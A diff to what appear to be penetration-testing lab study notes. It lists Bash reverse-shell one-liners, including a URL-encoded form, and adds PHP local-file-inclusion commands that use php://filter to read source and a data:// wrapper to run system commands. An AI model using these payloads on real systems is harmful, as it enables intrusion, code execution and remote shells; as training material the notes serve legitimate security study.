@@ -171,3 +171,11 @@ quick note: windows path traversal: ```curl --path-as-is http://192.168.205.193:
   - Bash reverse shell one-liner: ```bash -i >& /dev/tcp/<target IP>/4444 0>&1```
   - Bash reverse shell one-liner executed as command in Bash: ```bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"```
   - With URL encoding: ```bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22```
+
+## PHP Wrappers
+
+- Utilize the Local File Inclusion call: ```curl http://mountaindesserts.com/meteor/index.php?page=admin.php```
+- Using the ```php://filter``` call: ```curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php``` << the "resource" is the required parameter to specify the file stream for filtering, which is the filename in this case.
+- Encoding the output for base64: ```curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php```
+  - Decoding the encoded output: ```echo "<output>" | base64 -d```
+- Using the ```data://``` call executing the ```ls``` command: ```curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"```
